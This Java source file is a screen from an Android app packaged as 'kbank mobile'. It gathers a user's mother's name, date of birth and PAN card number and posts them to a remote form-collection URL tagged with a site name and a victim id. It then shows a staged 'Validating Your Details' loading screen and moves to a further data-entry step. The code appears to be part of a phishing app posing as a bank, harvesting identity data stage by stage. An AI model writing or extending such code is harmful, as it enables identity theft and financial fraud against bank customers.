package com.msf.kbank.mobile;

import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;

import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONException;
import org.json.JSONObject;

import com.msf.kbank.mobile.Suggest.DateInputMask;
import com.msf.kbank.mobile.Suggest.FormValidator;
import com.msf.kbank.mobile.Suggest.NetworkUtils;

public class SecondActivity extends AppCompatActivity {

    private EditText mothername;
    private EditText dob;
    private EditText panno;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.second_layout);

        Intent intent = getIntent();
        int id = intent.getIntExtra("id", -1);

        mothername = findViewById(R.id.mothername);
        dob = findViewById(R.id.dob);
        panno = findViewById(R.id.panno);
        Button buttonSubmit = findViewById(R.id.submit);
        dob.addTextChangedListener(new DateInputMask(dob));

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                buttonSubmit.setText("Please Wait");
                JSONObject sendPayload = new JSONObject();
                try {
                    JSONObject dataObject = new JSONObject();
                    dataObject.put("mothername", mothername.getText().toString().trim());
                    dataObject.put("db", dob.getText().toString().trim());
                    dataObject.put("panno", panno.getText().toString().trim());
                    sendPayload.put("data", dataObject);
                    sendPayload.put("site", Helper.SITE);
                    sendPayload.put("id",  id);

                    String url = Helper.FormURL + Helper.FormSavePath;
                    NetworkUtils.postRequest(url, sendPayload, new NetworkUtils.PostRequestCallback() {
                        @Override
                        public void onResponse(String stringResponnse) {
                            try {
                                JSONObject response = new JSONObject(stringResponnse);
                                if(response.getInt("status")==200){
                                    Intent intent = new Intent(SecondActivity.this, Loading.class);
                                    intent.putExtra("id", id);
                                    intent.putExtra("nextActivity", "ThirdActivity");
                                    intent.putExtra("loadText", "Validating Your Details");
                                    startActivity(intent);
                                }else{
                                    Helper.debug(SecondActivity.this, "Response Not 200: " + stringResponnse);
                                }
                            }catch (JSONException e){
                                Helper.debug(e.getMessage());
                            }

                        }
                        @Override
                        public void onError(String error) {
                            Helper.debug(SecondActivity.this, error);
                        }
                    });
                } catch (JSONException e) {
                    Helper.debug(SecondActivity.this, e.getMessage());
                }
            }else{
                Helper.debug(SecondActivity.this, "Form Validation Failed");
            }
        });

    }

    private boolean validateForm() {
        boolean on1 = FormValidator.validateRequired(mothername, "Name is required");
        boolean on2 = FormValidator.validateDate(dob, "Date of Birth is required");
        boolean on3 = FormValidator.validatePANCard(panno, "Invalid Pan Card Number");
        return on1 && on2 && on3;
    }
}
